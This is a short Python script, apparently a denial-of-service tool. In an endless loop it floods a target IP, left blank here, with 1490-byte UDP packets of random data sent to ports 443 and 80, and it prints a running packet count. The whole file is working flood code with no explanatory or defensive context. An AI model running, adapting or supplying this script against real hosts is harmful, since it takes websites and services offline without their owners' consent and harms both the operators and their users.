import os
import sys
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #udp
#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #tcp
#bytes = random._urandom(1024)
#print(bytes)
bytes = random._urandom(1490)
#print(bytes)

sent = 0

while True:
    try:
        ip = ""
        port = 443 #https
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        print("Sent",sent,"packets to",ip,"through",port,)
        port = 80 #http
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        print("Sent",sent,"packets to",ip,"through",port,)
    except KeyboardInterrupt:
        sys.exit()